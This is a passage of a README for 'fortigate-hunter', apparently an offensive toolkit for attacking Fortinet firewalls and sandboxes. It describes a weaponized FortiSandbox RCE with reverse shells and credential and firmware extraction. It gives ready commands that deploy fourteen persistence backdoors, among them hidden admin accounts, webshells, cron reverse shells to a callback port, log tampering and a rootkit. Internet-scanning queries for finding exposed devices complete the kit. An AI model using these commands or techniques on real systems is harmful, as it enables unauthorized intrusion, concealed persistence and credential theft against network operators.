| CVE-2026-25089 | FortiSandbox | CRITICAL | `cmd_injection` | 🔴 ACTIVE (PoC) |
| CVE-2026-25090 | FortiSandbox | HIGH | `xxe_probe` | - |
| CVE-2026-25091 | FortiOS 8.0 | HIGH | `version_check` | - |
| CVE-2026-25092 | FortiOS 8.0 | CRITICAL | `fgfm_probe` | - |

**Legend:** 🔴 ACTIVE = Being exploited in the wild (CISA KEV / Mandiant / CERT) · ⚠️ PoC = Public proof-of-concept available

---

## 💥 Fuzzing Payload Categories (40+)

The fuzzer includes the following payload categories:

| Category | Payloads | Endpoints | Detection Method |
|----------|----------|-----------|------------------|
| Path Traversal | 16 | 5 | Sensitive data (`root:`) |
| Symlink Bypass | 10 | 10 | Config file access |
| Format String | 12 | 5 | Hex addresses in response |
| Buffer Overflow | 13 | 4 | Crash + recovery |
| Command Injection | 13 | 3 | Error indicators |
| SAML XXE | 5 | 2 | Stacktrace / error leak |
| WebSocket Injection | 5 | 3 | Memory leak, stacktrace |
| HTTP Smuggling | 5 | 5 | Protocol violations |
| JWT Fuzzing | 7 | 3 | Algorithm confusion |
| WebSocket Protocol | 8 | 3 | Invalid opcodes/fragments |
| Credential Exfil | 9 | 5 | Credential patterns |

**Total:** 40+ payload categories across 39+ endpoints

### Anomaly Scoring

The anomaly detection system uses the following scoring methods:

| Method | Description |
|--------|-------------|
| Z-Score | Statistical deviation from baseline |
| IQR | Robust outlier detection |
| Content-Aware | Pattern matching for sensitive data |
| Multi-Stage Correlation | Correlated anomalies across endpoints |
| Severity Weighting | Prioritized scoring |

### Severity Weights

Each anomaly type carries the following severity weight:

| Anomaly Type | Weight |
|--------------|--------|
| Memory leak | 10 |
| Stacktrace | 9 |
| Sensitive data | 10 |
| 5× time deviation | 5 |
| 2× length deviation | 3 |
| Error indicator | 4 |

---

## 🔐 Post-Exploitation (10 Modules)

The post-exploitation module includes the following components:

| # | Module | Description |
|---|--------|-------------|
| 1 | **Firmware Extraction** | ChaCha20/AES-CBC/AES-GCM rootfs decryption |
| 2 | **FortiCrack Integration** | Offline decryption of `.out` files |
| 3 | **FortiSandbox RCE** | CVE-2026-25089 weaponized exploit |
| 4 | **BIOS Bypass** | Signature certificates, signing keys |
| 5 | **Partition Extraction** | Active/backup partition dumping |
| 6 | **Update Interception** | TLS interception, key extraction |
| 7 | **Memory Forensics** | Process dumping, key extraction |
| 8 | **Hardware Extraction** | UART/JTAG console capture |
| 9 | **Config Decryption** | LDAP credential decryption |
| 10 | **Persistence** | 14 mechanisms (see below) |

### Firmware Extraction Pipeline

The firmware extraction process follows a sequential pipeline:

1. **Shell Access** → Establish root shell on target
2. **Enumerate System** → Identify partitions and firmware layout
3. **Extract Live Files** → Copy critical files via `fnsysctl`
4. **Dump Partitions** → Copy raw flash partitions
5. **Decrypt Rootfs** → Decrypt using ChaCha20/AES-CBC/AES-GCM
6. **Extract Binaries** → Unpack `bin.tar.xz`
7. **Extract Config** → Parse `system.conf` and credentials
8. **Package for Analysis** → Create tarball for offline analysis
9. **FortiCrack Decryption** → Optional offline decryption of `.out` files

### FortiCrack Integration

The FortiCrack wrapper provides:

- Known-plaintext attack for key extraction
- Automatic firmware version detection
- Build and version extraction
- Offline decryption of encrypted `.out` files

---

## 🧩 Persistence Mechanisms (14)

The persistence module deploys the following mechanisms:

| # | Mechanism | Description |
|---|-----------|-------------|
| 1 | **Symlink (CVE-2025-68686)** | SSL-VPN language folder symlink to root |
| 2 | **Admin Account** | Hidden admin with trusted hosts |
| 3 | **API User Token** | Token survives password changes |
| 4 | **SSH Key** | Passwordless SSH access |
| 5 | **Cron Job** | Scheduled reverse shell |
| 6 | **rc.local** | Startup script persistence |
| 7 | **Automation Stitch** | Event-triggered persistence |
| 8 | **Webshell** | PHP/JSP backdoor in web root |
| 9 | **VPN Backdoor** | IPsec tunnel backdoor |
| 10 | **Config Persistence** | System settings auto-execution |
| 11 | **Log Tampering** | Disable/filter logs to hide activity |
| 12 | **HA Sync** | Sync malicious config to HA peers |
| 13 | **Firmware Persistence** | Embed backdoor in firmware updates |
| 14 | **Rootkit Loader** | LKM rootkit for deep persistence |

### Persistence Usage Examples

The following examples demonstrate how to deploy and clean up persistence mechanisms.

To deploy all persistence mechanisms, use the `--persist` flag with a shell connection. This deploys all 14 mechanisms simultaneously:

```bash
fortigate-hunter -t https://target --shell "ssh root@target" --persist
```

To deploy only specific mechanisms, specify them as a comma-separated list using the `--persist-mechanisms` flag. This gives you granular control over which backdoors are installed:

```bash
fortigate-hunter -t https://target --shell "ssh root@target" \
    --persist --persist-mechanisms symlink,admin_account,webshell
```

To use a custom callback host and port for reverse shells, use the `--persist-callback` and `--persist-port` options. This is useful when you need to route traffic through a specific listener:

```bash
fortigate-hunter -t https://target --shell "ssh root@target" \
    --persist --persist-callback 192.168.1.100 --persist-port 4444
```

To remove all deployed persistence mechanisms, run the cleanup command. This removes crons, admin accounts, symlinks, and all other backdoors:

```bash
fortigate-hunter -t https://target --shell "ssh root@target" \
    --cleanup-persistence
```

---

## 🧠 ML/AI Enhancements

The ML/AI module includes the following models:

| # | Model | Description |
|---|-------|-------------|
| 1 | **EPSS Local Predictor** | XGBoost — predicts exploitation probability. ROC-AUC > 0.99. Features: CVE age, CVSS, description, vendor |
| 2 | **Anomaly Detection** | Autoencoder + CNN Hybrid. Autoencoder for numerical features, CNN for content analysis, ensemble with IsolationForest |
| 3 | **Intelligent Payload Generation** | RL-Inspired adaptive payload generation. Thompson sampling, evolutionary mutation, feedback-based learning |
| 4 | **Vulnerability Classification** | Random Forest — 15 attack types. TF-IDF + Random Forest, confidence scoring |

### ML/AI Usage Examples

The following commands demonstrate how to use the ML/AI enhancements.

To enable all ML enhancements in a scan, use the `--ml-enable` flag. This activates EPSS prediction, anomaly detection, payload generation, and classification simultaneously:

```bash
fortigate-hunter -t https://target --ml-enable --check-cve
```

To train the ML models on historical data before running scans, use the `--ml-train` flag. This builds the models from the training data stored in `~/.fortigate_hunter/`:

```bash
fortigate-hunter --ml-train
```

To only use EPSS prediction (exploitation probability scoring), use the `--ml-epss` flag with a CVE check:

```bash
fortigate-hunter -t https://target --ml-epss --check-cve
```

To use intelligent payload generation for fuzzing, use the `--ml-payload` flag. This generates adaptive payloads based on real-time feedback:

```bash
fortigate-hunter -t https://target --ml-payload --fuzz
```

To use ML-based anomaly detection during fuzzing, use the `--ml-anomaly` flag. This uses the autoencoder + CNN hybrid to detect subtle anomalies:

```bash
fortigate-hunter -t https://target --ml-anomaly --fuzz
```

To classify vulnerabilities during a scan, use the `--ml-classify` flag. This categorizes CVEs into 15 attack types with confidence scoring:

```bash
fortigate-hunter -t https://target --ml-classify --check-cve
```

### Model Storage

Models are stored in `~/.fortigate_hunter/` with the following filenames:

- `epss_model.pkl` — EPSS predictor
- `anomaly_model.pkl` — Anomaly detector
- `vuln_classifier.pkl` — Vulnerability classifier

---

## 🌐 OSINT Integration

### Shodan (7 pre-built queries)

The following Shodan queries are pre-configured in the tool:

- `http.favicon.hash:-1074357429`
- `port:10443 "FortiOS"`
- `port:443 "Server: FortiOS"`
- `port:10443 "FortiManager"`
- `port:541 "FortiManager"`
- `http.title:"FortiGate 8.0"`
- `port:8443 "WebSocket" "FortiGate"`

### Censys

The Censys client provides:

- Full async client
- Custom query support
- Service and banner search

### FOFA

The FOFA client provides:

- Full async client
- Custom query support
- Title and banner search

### OSINT Usage Examples

The following commands demonstrate how to use OSINT integrations.

To search Shodan for Fortinet devices, provide your Shodan API key:

```bash
fortigate-hunter --shodan-key YOUR_API_KEY
```

To search Censys, provide your Censys API ID and secret:

```bash
fortigate-hunter --censys-id ID --censys-secret SECRET
```

To search FOFA, provide your FOFA email and API key:

```bash
fortigate-hunter --fofa-email EMAIL --fofa-key KEY
```

---

## 🖥️ Web Dashboard

The BrokenSec Web Dashboard provides a graphical interface for scanning and monitoring.

### Features

The dashboard includes the following features:

- Real-time scan controls
- Live progress tracking
- Statistics display (CVEs, anomalies, FGFM, persistence, duration)
- Graphical result rendering
- BrokenSec dark theme with glitch effects
- "DATA CORRUPT" branding
- ML/AI status display
- OSINT result display
- Persistence deployment controls

### Endpoints

The dashboard exposes the following REST API endpoints:

| Endpoint | Description |
|----------|-------------|
| `/` | Dashboard UI |
| `/api/status` | Scan status (scanning, progress, results_ready, ml_available) |
| `/api/results` | Full scan results (JSON) |
| `/api/scan` | Start new scan (POST with `{"target": "url"}`) |
| `/api/ml-status` | ML/AI model status |
| `/api/shutdown` | Shutdown dashboard |

### Launch Commands

The dashboard can be launched with the following commands.

To launch the dashboard on the default host and port (0.0.0.0:8080), use the `--web-dashboard` flag:

```bash
fortigate-hunter --web-dashboard
```

To launch the dashboard on a custom host and port, use the `--dashboard-host` and `--dashboard-port` options:

```bash
fortigate-hunter --web-dashboard --dashboard-host 127.0.0.1 --dashboard-port 5000
```

---

## 📦 Installation

### Prerequisites

Before installing, ensure the following prerequisites are met:

- Python 3.10+
- `pip`
- Network access to targets
- Optional: `paramiko` (SSH), `pyserial` (UART), `pyftdi` (JTAG)
- Optional: `xgboost`, `tensorflow`, `scikit-learn` (ML/AI)

### Quick Install

To install the project with all optional features, navigate to the project directory and run:

```bash
cd fortigate-hunter
pip install -e .[all]
```

### Install with Specific Features

To install the core only (no optional features), run:

```bash
pip install -e .
```

To install with SSH shell support, run:

```bash
pip install -e .[shell]
```

To install with hardware extraction support (UART/JTAG), run:

```bash
pip install -e .[hardware]
```

To install with ML/AI support (EPSS, anomaly detection, payload generation, classification), run:

```bash
pip install -e .[ml]
```

To install everything (all optional features), run:

```bash
pip install -e .[all]
```

### Install FortiCrack (Optional)

To install FortiCrack for offline firmware decryption, clone the repository and install it:

```bash
git clone https://github.com/bishopfox/forticrack.git
cd forticrack
pip install -e .
```

### Verification

To verify the installation is working, run the help command:

```bash
fortigate-hunter --help
```

---

## 🚀 Quick Start

### Basic Fingerprinting

To perform basic fingerprinting on a target, provide the target URL with the `-t` flag:

```bash
fortigate-hunter -t https://192.168.1.99:443
```

### Full Assessment

To run a full security assessment (CVE detection, fuzzing, FGFM probing), use all the flags together:

```bash
fortigate-hunter -t https://192.168.1.99:443 \
    --check-cve --fuzz --aggressive --fgfm-probe -v
```

### FortiSandbox Assessment

To assess a FortiSandbox instance, provide its URL and run CVE detection:

```bash
fortigate-hunter -t https://192.168.1.100:8080 --check-cve
```

### Shodan Enumeration

To search Shodan for Fortinet devices, provide your Shodan API key:

```bash
fortigate-hunter --shodan-key YOUR_API_KEY
```

### Censys Enumeration

To search Censys for Fortinet devices, provide your Censys API credentials:

```bash
fortigate-hunter --censys-id ID --censys-secret SECRET
```

### FOFA Enumeration

To search FOFA for Fortinet devices, provide your FOFA credentials:

```bash
fortigate-hunter --fofa-email EMAIL --fofa-key KEY
```

### Launch Web Dashboard

To launch the web dashboard, use the `--web-dashboard` flag:

```bash
fortigate-hunter --web-dashboard
```

### Post-Exploitation (Firmware Extraction)

To extract firmware from a compromised device, you need a shell connection and the `--extract-firmware` flag:

```bash
fortigate-hunter -t https://192.168.1.99:443 \
    --extract-firmware --shell "ssh root@192.168.1.99"
```

### Persistence Deployment

To deploy persistence mechanisms on a compromised device, provide a shell connection and the `--persist` flag:

```bash
fortigate-hunter -t https://192.168.1.99:443 \
    --shell "ssh://root:pass@192.168.1.99" --persist
```

### ML/AI Enhancements

To run scans with ML/AI enhancements (EPSS prediction, anomaly detection, payload generation), use the `--ml-enable` flag:

```bash
fortigate-hunter -t https://192.168.1.99:443 \
    --ml-enable --check-cve --fuzz
```

---

## 🏗️ Architecture

The project follows a modular architecture with the following directory structure:

```txt
fortigate_hunter/
├── __init__.py                     # Package init
├── cli.py                          # Command-line entry (700+ lines)
├── core/                           # Core modules
│   ├── __init__.py
│   ├── constants.py                # Build mappings, keys, 8.0.0 support
│   ├── cve_database.py             # 28+ CVEs including FortiSandbox
│   ├── fingerprint.py              # Full fingerprinting engine
│   ├── fuzz_payloads.py            # 40+ payload categories
│   ├── shell.py                    # SSH with PTY (paramiko)
│   ├── hardware.py                 # UART/JTAG hardware extraction
│   ├── parallel.py                 # Parallel scan engine
│   └── utils.py                    # Utilities
├── detectors/                      # CVE detectors (10+ modules)
│   ├── __init__.py
│   ├── base.py                     # Abstract base class
│   ├── cve_2018_13379.py           # Path traversal
│   ├── cve_2024_23113.py           # FGFM format string
│   ├── cve_2024_47574.py           # FortiJump
│   ├── cve_2024_47575.py           # FGFM RCE
│   ├── cve_2025_59718.py           # SAML bypass
│   ├── cve_2026_20024.py           # SSL-VPN bypass
│   ├── cve_2026_22153.py           # LDAP bypass
│   ├── cve_2026_24858.py           # FortiCloud SSO
│   ├── cve_2026_25815.py           # Static key
│   ├── cve_2026_59840.py           # Buffer overread
│   ├── cve_2026_25089.py           # FortiSandbox RCE (weaponized)
│   ├── symlink_bypass.py           # CVE-2025-68686
│   └── websocket_rce.py            # CVE-2025-0901
├── fuzzing/                        # Fuzzing engines
│   ├── __init__.py
│   ├── sslvpn_fuzzer.py            # SSL VPN fuzzing (39 endpoints)
│   ├── websocket_fuzzer.py         # WebSocket fuzzing
│   ├── protocol_fuzzer.py          # SSH, HTTPS, SNMP
│   └── anomaly_scorer.py           # ML-enhanced scoring (450+ lines)
├── fgfm/                           # FGFM protocol
│   ├── __init__.py
│   └── prober.py                   # Full FGFM probe suite
├── post_exploit/                   # Post-exploitation (10 modules)
│   ├── __init__.py
│   ├── firmware_extractor.py       # Full firmware extraction
│   ├── forticrack_integration.py   # FortiCrack wrapper
│   ├── bios_bypass.py              # BIOS integrity bypass
│   ├── partition_extractor.py      # Dual partition extraction
│   ├── update_interceptor.py       # Update interception
│   ├── memory_forensics.py         # Memory forensics
│   ├── hardware_extractor.py       # JTAG/UART extraction
│   ├── config_parser.py            # Config decryption
│   └── persistence.py              # 14 mechanisms (600+ lines)
├── reporting/                      # Reports
│   ├── __init__.py
│   └── report.py                   # JSON + HTML reports
├── shodan/                         # Shodan integration
│   ├── __init__.py
│   └── client.py                   # Async Shodan client
├── censys/                         # Censys integration
│   ├── __init__.py
│   └── client.py                   # Async Censys client
├── fofa/                           # FOFA integration
│   ├── __init__.py
│   └── client.py                   # Async FOFA client
├── threat_intel/                   # Threat intelligence
│   ├── __init__.py
│   └── feed.py                     # CISA KEV, EPSS, GitHub PoCs
├── web/                            # Web Dashboard
│   ├── __init__.py
│   ├── dashboard.py                # aiohttp server
│   └── static/                     # Frontend assets
│       ├── index.html              # Full dashboard HTML
│       ├── style.css               # BrokenSec dark theme
│       └── script.js               # Real-time updates
├── ml/                             # ML/AI enhancements
│   ├── __init__.py
│   ├── epss_predictor.py           # XGBoost EPSS prediction (400+ lines)
│   ├── anomaly_detector.py         # Autoencoder + CNN hybrid (350+ lines)
│   ├── payload_generator.py        # RL-inspired payload gen (350+ lines)
│   └── vulnerability_classifier.py # Random Forest classification (300+ lines)
├── tests/                          # Test suite
│   ├── __init__.py
│   └── test_full.py                # Full test coverage
└── docs/                           # Documentation
    ├── conf.py                     # Sphinx configuration
    ├── index.rst                   # Documentation index
    ├── overview.rst                # Overview
    ├── installation.rst            # Installation guide
    ├── persistence.rst             # Persistence module docs
    └── ml_ai.rst                   # ML/AI module docs
```

---

## 📚 Module Details

### Core Modules

#### constants.py

The constants module contains:

- Build-to-version mapping (50+ builds, 7.0 → 8.0.0)
- Static encryption keys (CVE-2026-25815)
- FortiOS 8.0.0 AES-256-GCM key
- FortiSandbox endpoints and injection points
- FGFM protocol constants
- Shodan/Censys/FOFA queries

#### cve_database.py

The CVE database contains:

- 28+ CVEs with affected versions, CVSS, active exploitation flags
- Includes FortiSandbox and 8.0.0 CVEs
- Product-specific CVEs (FortiOS, FortiManager, FortiSandbox)

#### fingerprint.py

The fingerprinting engine provides:

- Full fingerprinting: headers, `/remote/info`, favicon, SSL, API v2/v3, WebSocket, SAML, FortiCloud SSO
- Build-to-version resolution

### Detectors

#### cve_2026_25089.py

The FortiSandbox RCE detector provides:

- FortiSandbox RCE (CVE-2026-25089)
- Full exploitation framework
- Reverse shell (netcat, bash, python, wget)
- Config extraction
- Persistence establishment

### Post-Exploitation

#### firmware_extractor.py

The firmware extractor provides:

- Live extraction via `fnsysctl`
- Flash partition dumping
- Rootfs decryption (ChaCha20, AES-CBC, AES-GCM)
- FortiCrack integration
- Binary extraction from `bin.tar.xz`
- Configuration extraction

#### forticrack_integration.py

The FortiCrack wrapper provides:

- Wrapper for Bishop Fox's FortiCrack
- Offline decryption of `.out` files
- Key extraction (known-plaintext attack)
- Version and build detection
- Automatic validation

#### persistence.py

The persistence module provides:

- 14 persistence mechanisms
- Full deployment and cleanup
- APT-style techniques (FortiBleed, UNC3886)
- HA sync propagation

### Fuzzing

#### sslvpn_fuzzer.py

The SSL VPN fuzzer provides:

- 39 endpoints
- 40+ payload categories
- Baseline comparison
- Anomaly scoring
- Crash recovery (exponential backoff)

#### anomaly_scorer.py

The anomaly scorer provides:

- Z-score + IQR + content-aware + ML
- Multi-stage correlation
- Severity weighting

### ML/AI

#### epss_predictor.py

The EPSS predictor provides:

- XGBoost model
- ROC-AUC > 0.99
- Automatic training and persistence

#### anomaly_detector.py

The anomaly detector provides:

- Autoencoder + CNN hybrid
- TensorFlow/Keras implementation
- IsolationForest fallback

#### payload_generator.py

The payload generator provides:

- Thompson sampling
- Evolutionary mutation
- Feedback learning

#### vulnerability_classifier.py

The vulnerability classifier provides:

- Random Forest
- 15 attack types
- Confidence scoring

### Web Dashboard

#### dashboard.py

The dashboard provides:

- aiohttp-based web server
- REST API: `/api/status`, `/api/results`, `/api/scan`, `/api/ml-status`
- Serves static frontend
- ML/AI integration
- Persistence display

#### static/

The static frontend provides:

- BrokenSec-themed dark UI
- Real-time progress, statistics, result display
- Glitch effects, "DATA CORRUPT" branding
- ML and persistence controls

---

## 🛠️ Troubleshooting

### Connection Issues

To check connectivity to the target, use `ping` to test reachability and `nc` to test the specific port:

```bash
ping 192.168.1.99
```

```bash
nc -zv 192.168.1.99 443
```

### FortiCrack Issues

If FortiCrack is not working:

- Ensure `forticrack.py` is in PATH or installed via pip.
- Verify with: `which forticrack.py`
- Install with: `pip install -e /path/to/forticrack`

### Firmware Extraction Fails

If firmware extraction fails:

- Need root shell access.
- Check flash partitions: `diag sys flash list`
- Use FortiCrack for offline decryption.

### Web Dashboard Not Starting

If the dashboard fails to start:

- Ensure port 8080 is free.
- Use custom port: `--dashboard-port 5000`
- Check permissions for `static/` directory.

### Shell Connection Fails

If shell connection fails:

- Install paramiko: `pip install paramiko`
- Verify SSH credentials.
- Check firewall and network connectivity.

### Hardware Extraction

For hardware extraction, install the following dependencies:

```bash
pip install pyserial
pip install pyftdi
apt-get install openocd
```

### ML/AI Issues

If ML/AI features are not working:

- Install dependencies: `pip install xgboost tensorflow scikit-learn joblib`
- Models auto-train on first use with `--ml-train`.
- Fallback to rule-based if ML unavailable.
- Check model directory: `~/.fortigate_hunter/`

### Censys/FOFA API Issues

If OSINT API calls fail:

- Verify API credentials.
- Check quota limits.
- Use `--shodan-limit` to reduce results.

---

## 📄 License

This project is proprietary software. All rights reserved.  
Copyright © 2026 **YogSotho** / **BrokenSec**

---

## 🙏 Acknowledgments

The following individuals and organizations have contributed to this project:

- **Bishop Fox** — FortiCrack method
- **GreyNoise Labs** — ChaCha20 key research
- **RandoriSec** — AES key derivation for 7.4.7+
- **CISA** — Known Exploited Vulnerabilities catalog
- **Fortinet PSIRT** — Vulnerability disclosure
- **exfil0** — CVE-2025-59718 PoC
- **FIRST.org** — EPSS scoring methodology

---

<div align="center">
  <img src="assets/yogsotho.jpg" alt="Fortinet Hunter 2026" width="800"/>

## 🤌🏻 Author

| | |
|---|---|
| **Author** | YogSotho |
| **Team** | BrokenSec |

---

> *"EXPLOITING THE UNKNOWN. O-DAY SPECIALISTS."*

**Stay safe. Stay ethical. Hunt wisely.**
